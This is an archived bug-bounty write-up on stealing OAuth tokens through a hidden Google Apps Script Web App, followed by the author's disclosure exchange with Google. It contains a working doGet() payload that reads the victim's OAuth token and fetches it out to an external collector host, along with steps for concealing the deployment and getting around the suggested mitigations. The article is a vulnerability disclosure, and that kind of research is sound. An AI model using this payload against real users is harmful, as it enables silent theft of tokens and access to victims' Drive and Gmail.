# 1-CLick OAuth Token Hijacking via Google Apps Script – A Design Flaw Ignored? | Bug Bounty

- **Source URL:** https://ph-hitachi.medium.com/1-click-oauth-token-hijacking-via-google-apps-script-a-design-flaw-ignored-bug-bounty-02c6997254ff?source=rss------bug_bounty-5
- **Fetched from:** https://web.archive.org/web/20250414163635/https://ph-hitachi.medium.com/1-click-oauth-token-hijacking-via-google-apps-script-a-design-flaw-ignored-bug-bounty-02c6997254ff
- **Fetched:** 2026-11-23
- **Channel:** @dailybountywriteup
- **Telegram message:** https://t.me/dailybountywriteup/9352 (id 9352)
- **Method:** wayback-machine-snapshot readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
# 1-CLick OAuth Token Hijacking via Google Apps Script – A Design Flaw Ignored? | Bug Bounty

# Introduction

While reviewing how Google Apps Script handles authorization, I stumbled upon a significant yet subtle security gap — **OAuth tokens can be exfiltrated and abused silently within the same script project**.

The core issue revolves around the ability to exfiltrate OAuth tokens within the scope of Google Apps Script Web Apps. This vulnerability allows attackers to retrieve sensitive OAuth tokens when they have access to the project, which can then be leveraged to access and manipulate critical Google services. **Although Google Apps Script cannot be used to full takeover user accounts**, the exfiltration of OAuth tokens with broad scopes (such as Google Drive or Gmail) can result in severe security consequences.

# Proof of Concept

**Exploitable Scenarios:**

- **Access to Google Drive Files**: Attackers can gain access to and modify user files stored on Google Drive if the OAuth token is associated with such access.
- **Sending Emails**: Exfiltrated tokens tied to Gmail access could enable attackers to send unauthorized emails from a compromised account.
- **Unauthorized Actions**: The stolen OAuth token allows attackers to execute actions on the user’s behalf, depending on the granted scopes, which can include accessing sensitive data and performing malicious actions.

# About the Project

# Google Drive File Converter

A simple Google Apps Script project that allows users to **convert Google Drive files to PDF** and share them via email.

## Project OAuth Scopes:

- [https://www.googleapis.com/auth/drive](https://www.googleapis.com/auth/drive)
- [https://www.googleapis.com/auth/userinfo.email](https://www.googleapis.com/auth/userinfo.email)
- [https://www.googleapis.com/auth/script.send_mail](https://www.googleapis.com/auth/script.send_mail)

# Initial Setup:

## Owner:

- Creates & deploy legimate project with original script.
- The owner makes changes to `Code.gs` and `index.html` and **deploys the Web App**:
- **Name:** Google File Converter WebApp
- **Execute as:** User accessing the web
- **Who has access:** Anyone with a Google account
- **Deployment Link:**
`https://script.google.com/macros/s/<deployement_id>/exec`

## Editor:

- make some fixes to the google app script project **(Google Drive File Converter)** and test if working.

## Customer:

- the user use the project called “**Google Drive File Converter**” that deployed by the owner with fixes by the editor.

## Victim: (owner, editor, or customer):

Grants OAuth permissions to the project linking their accounts to `third-party app` **(Google Drive File Converter)** that has access to:

- See, edit, create, and delete all of your Google Drive files
- Send email as you

# Attack Scenario

## Step 1: The Editor Deploys The Malicious Web App

A **malicious editor adds a new script** (`Malicious.gs`) and **deploys it as a Web App without modifying the original script**. This prevents detection in the project history with this settings:

- **Execute as:** User accessing the web
- **Who has access:** Anyone with a Google account
- **Deployment Link:**
`https://script.google.com/macros/s/<deployement_id>/exec`

```
function doGet() {
  Session.getActiveUser(); // Include user information
  var token = ScriptApp.getOAuthToken(); // Retrieve OAuth token
  var html = HtmlService.createHtmlOutput(`
      <h2>OAuth Token Exfiltration via Google Apps Script Web App</h2>
      <p>Your OAuth Token:</p>
      <textarea rows="5" cols="50">${token}</textarea>
      <script>
        // Send the OAuth Token to Attacker Server
        var attackerUrl = "https://ccur3stcnvc98u9a5f8r04htbe1j6hirji.oast.online/token?access_token=${token}";
        fetch(attackerUrl, { method: "GET" });
      </script>
  `);
  return html.setSandboxMode(HtmlService.SandboxMode.NONE);
}
```
## Step 2: Attacker Deletes the Malicious.gs Script

- The attacker **deletes** `Malicious.gs` after deployment.
- The **malicious Web App remains active** and `linked` to the **project**.
- The owner **unaware** to the deployed Web App.

## Step 3: Attacker Exploit The 1-Click Account Takeover

- The attacker sends the **malicious Web App link** to the victim (owner, editor, or customer).
- **Once the victim visits the link, their OAuth token is automatically exfiltrated sent to attacker server.**
- The attacker now has `access` to the victim’s **Google Drive, Gmail, and personal data** without `further user interaction`.

## Timeline of Discussions with Google Security Team & Trust & Safety

i Initially reported the issue **as “OAuth Token Exfiltration via Google Apps Script Web App Without External Request Scope.”** However, due to additional findings and missing details in the original report, the attack scenario became difficult to trace, leading to misunderstandings. I submitted new reports and received kind response from “st…@google.com”

However, Google Trust & Safety Team refused to fix the issue as they believe victim (user) should trust any member they have to invite and suggest the mitigations.

But those **mitigations can be bypass in many ways** as example:

After i submitted the other bypass they **reopen** the issue but close it immediately suggesting, “**Audit logs” & “Limiting fetch service domains”**

However, the proposed mitigations (audit logs & domain restrictions) are only available for **enterprise organizations**, leaving **individual developers and small teams vulnerable**.

After i bypassed the “suggested mitigation” and prove the current solution are ineffective:

- **Audit logs do not provide real-time protection**, meaning attacks can occur before detection is possible.
- **Limiting fetch service domains does not mitigate the attack**, as it does not rely on `UrlFetchApp` Service. (it can bypass by JavaScript Fetch)
- **The lack of ownership controls allows editors to deploy Web Apps without owner awareness (notification)**, making it possible for attackers to introduce malicious scripts that **persist** even if the original script is unchanged.

well, i actually don’t have idea what criteria they use to assess the vulnerability but it was it is.

This time is still pushing the issue but they still refused to fix and said “**multiple team members have discussed this issue at length in order to ensure that your report was not misunderstood.**” This time i stopped pushing the vulnerability cause its already communicated to all team and that i only what i want to seek feedback from other Google Security Team from their perspective.

## Timeline of Discussions with Google Security Team & Trust & Safety

1. **Initial Discovery and Report** — The issue was first reported to Google VRP, detailing how OAuth tokens could be exfiltrated via Google Apps Script Web Apps. The vulnerability was shown to enable access to sensitive Google services and compromise both confidentiality and integrity.
2. **Mitigation Suggestions from Google:**

- **Audit Logs:** Google recommended using audit logs to track activities. However, the **lag time and retention period** in these logs (several hours or more) limit their usefulness for real-time security enforcement, allowing attackers to complete malicious actions before detection.
- **Limiting Fetch Service Domains:** Google also suggested limiting fetch service domains. However, the exploit itself does not rely on Fetch, meaning this particular mitigation would not prevent the attack.

1. **Follow-up Discussion and Feedback** — A more detailed report was submitted, explaining that these mitigations were insufficient to prevent the OAuth token exfiltration. Despite the demonstrated viability of the attack, Google Trust & Safety determined that it did not meet their criteria for an abuse risk escalation.
2. **Google’s Final Position:**

- **Severity Assessment**: While Google acknowledged the existence of the vulnerability, they decided that it did not meet the severity threshold required for tracking as an abuse risk. The issue was deemed important but not severe enough to trigger the escalation processes for abuse risks.

# Final Thoughts

This case isn’t about blaming Google. It’s about highlighting a **gap between platform convenience and real-world abuse potential**.

Apps Script is a powerful tool — but when tokens are **easy to access and hard to monitor**, attackers don’t need phishing or social engineering to compromise accounts. They just need access to a shared script or document.

Kudos to Google Security team for continued engagement even the report already closed, while other program does not give you a chance to explain the vulnerability once security analysts does not understand your report, Google security team patiently review your feedback and give response.

**Contact**:

Email: [ph-hitachi@wearehackerone.com](mailto:ph-hitachi@wearehackerone.com)

Twitter: [https://x.com/PhHitachi](https://x.com/PhHitachi)

LinkedIn: [www.linkedin.com/in/phhitachi](http://www.linkedin.com/in/phhitachi)
